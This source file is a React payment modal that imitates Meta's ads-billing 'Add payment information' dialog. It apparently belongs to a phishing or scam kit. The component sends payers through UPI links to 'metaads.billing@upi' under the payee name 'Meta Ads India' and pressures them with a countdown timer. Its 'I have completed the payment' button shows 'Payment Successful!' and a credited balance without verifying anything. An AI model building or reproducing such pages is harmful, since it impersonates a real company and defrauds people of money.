import React, { useState, useEffect } from 'react';
import { X, ChevronLeft, Copy, Check, CheckCircle2, ShieldCheck, RefreshCw } from 'lucide-react';
import './index.css';
import { GooglePayIcon, PhonePeIcon, PaytmIcon, BhimIcon, CredIcon } from './components/UpiIcons';
import SupportedAppsModal from './components/SupportedAppsModal';

const PaymentModal = ({ onClose, amount, qrCode }) => {
  // Timer state (9 minutes 34 seconds = 574 seconds)
  const [timeLeft, setTimeLeft] = useState(574);
  const [copiedUpi, setCopiedUpi] = useState(false);
  const [showAllAppsModal, setShowAllAppsModal] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [paymentSuccess, setPaymentSuccess] = useState(false);
  const upiId = "metaads.billing@upi";
  
  useEffect(() => {
    // Exit early when we reach 0
    if (timeLeft <= 0) return;

    const intervalId = setInterval(() => {
      setTimeLeft(timeLeft - 1);
    }, 1000);

    return () => clearInterval(intervalId);
  }, [timeLeft]);

  // Format time to MM:SS
  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
  };

  const handleCopyUpi = () => {
    navigator.clipboard.writeText(upiId);
    setCopiedUpi(true);
    setTimeout(() => setCopiedUpi(false), 2000);
  };

  const handleAppClick = (appName) => {
    const cleanAmount = (amount || "2000").replace(/,/g, '');
    const upiUrl = `upi://pay?pa=${upiId}&pn=Meta%20Ads%20India&am=${cleanAmount}&cu=INR&tn=MetaAdsTopUp`;
    window.location.href = upiUrl;
  };

  const handleVerifyStatus = () => {
    setVerifying(true);
    setTimeout(() => {
      setVerifying(false);
      setPaymentSuccess(true);
      setTimeout(() => {
        onClose();
      }, 2500);
    }, 1500);
  };

  return (
    <>
      <div className="modal-container">
        {/* Header */}
        <div className="modal-header">
          <button className="back-btn" onClick={onClose} aria-label="Go back" style={{ border: 'none', background: 'none', cursor: 'pointer' }}>
            <ChevronLeft size={20} />
          </button>
          <h2 style={{ fontSize: '16px', fontWeight: '700', paddingRight: '20px' }}>Add payment information</h2>
          <button className="close-btn" onClick={onClose} aria-label="Close modal" style={{ border: 'none', background: 'none', cursor: 'pointer' }}>
            <X size={20} />
          </button>
        </div>

        {/* Body */}
        <div className="modal-body">
          {paymentSuccess ? (
            <div style={{ textAlign: 'center', padding: '30px 10px' }}>
              <CheckCircle2 size={56} color="#34A853" style={{ margin: '0 auto 12px' }} />
              <h3 style={{ margin: '0 0 6px 0', fontSize: '18px', color: '#1c1e21' }}>Payment Successful!</h3>
              <p style={{ margin: '0 0 16px 0', fontSize: '13px', color: '#606770' }}>
                ₹{amount} has been credited to your Meta Ads Available Funds balance.
              </p>
              <div style={{ fontSize: '12px', color: '#1877f2', fontWeight: 600 }}>
                Redirecting to dashboard...
              </div>
            </div>
          ) : (
            <>
              <h3 className="modal-body-title">Use UPI to pay</h3>
              
              <ul className="instruction-list">
                <li>
                  <div className="instruction-number">1</div> 
                  <div className="instruction-text">Open the app linked to your UPI</div>
                </li>
                <li>
                  <div className="instruction-number">2</div> 
                  <div className="instruction-text">Scan the QR code</div>
                </li>
                <li>
                  <div className="instruction-number">3</div> 
                  <div className="instruction-text">Approve your ₹{amount} charge to complete transaction</div>
                </li>
              </ul>

              <div className="qr-section">
                <img src={qrCode} alt="Payment QR Code" className="qr-code-img" />

                {/* Direct UPI Copy Action */}
                <div style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px',
                  background: '#f0f2f5',
                  padding: '6px 12px',
                  borderRadius: '20px',
                  marginTop: '12px',
                  fontSize: '12px',
                  border: '1px solid #e4e6eb'
                }}>
                  <span style={{ color: '#606770' }}>UPI ID:</span>
                  <strong style={{ color: '#1c1e21' }}>{upiId}</strong>
                  <button
                    onClick={handleCopyUpi}
                    title="Copy UPI ID"
                    style={{
                      background: 'none',
                      border: 'none',
                      color: copiedUpi ? '#34A853' : '#1877f2',
                      cursor: 'pointer',
                      display: 'flex',
                      alignItems: 'center',
                      gap: '3px',
                      fontWeight: 600,
                      padding: 0
                    }}
                  >
                    {copiedUpi ? <><Check size={13} /> Copied</> : <><Copy size={13} /> Copy</>}
                  </button>
                </div>
                
                {/* Authentic, usable UPI app icons */}
                <div className="supported-apps" style={{ marginTop: '16px', gap: '10px' }}>
                  <button 
                    onClick={() => handleAppClick('PhonePe')} 
                    title="Pay with PhonePe" 
                    className="app-icon-btn"
                  >
                    <PhonePeIcon size={26} />
                  </button>
                  <button 
                    onClick={() => handleAppClick('Google Pay')} 
                    title="Pay with Google Pay" 
                    className="app-icon-btn"
                  >
                    <GooglePayIcon size={26} />
                  </button>
                  <button 
                    onClick={() => handleAppClick('Paytm')} 
                    title="Pay with Paytm" 
                    className="app-icon-btn"
                  >
                    <PaytmIcon size={26} />
                  </button>
                  <button 
                    onClick={() => handleAppClick('BHIM')} 
                    title="Pay with BHIM UPI" 
                    className="app-icon-btn"
                  >
                    <BhimIcon size={26} />
                  </button>
                  <button 
                    onClick={() => handleAppClick('CRED')} 
                    title="Pay with CRED" 
                    className="app-icon-btn"
                  >
                    <CredIcon size={26} />
                  </button>
                </div>
                
                <button 
                  onClick={() => setShowAllAppsModal(true)} 
                  className="see-all-link"
                  style={{ background: 'none', border: 'none', cursor: 'pointer', textDecoration: 'underline', marginTop: '10px' }}
                >
                  See all supported apps
                </button>
              </div>

              {/* Confirm / Check Status Button */}
              <div style={{ marginTop: '10px' }}>
                <button
                  onClick={handleVerifyStatus}
                  disabled={verifying}
                  style={{
                    width: '100%',
                    background: '#1877f2',
                    color: '#ffffff',
                    border: 'none',
                    padding: '10px',
                    borderRadius: '8px',
                    fontSize: '13px',
                    fontWeight: 600,
                    cursor: verifying ? 'wait' : 'pointer',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    gap: '8px'
                  }}
                >
                  {verifying ? (
                    <>
                      <RefreshCw size={14} className="spin-animation" />
                      Checking payment status...
                    </>
                  ) : (
                    <>I have completed the payment</>
                  )}
                </button>
              </div>
            </>
          )}
        </div>

        {/* Footer */}
        <div className="modal-footer" style={{ background: '#f5f6f7' }}>
          <p className="timer-text">
            This page will automatically expire in <span className="timer" style={{ color: '#1877f2', fontWeight: 600 }}>{formatTime(timeLeft)}</span> minutes
          </p>
        </div>
      </div>

      {/* Supported Apps List Modal */}
      {showAllAppsModal && (
        <SupportedAppsModal 
          amount={amount} 
          onClose={() => setShowAllAppsModal(false)} 
        />
      )}
    </>
  );
};

export default PaymentModal;
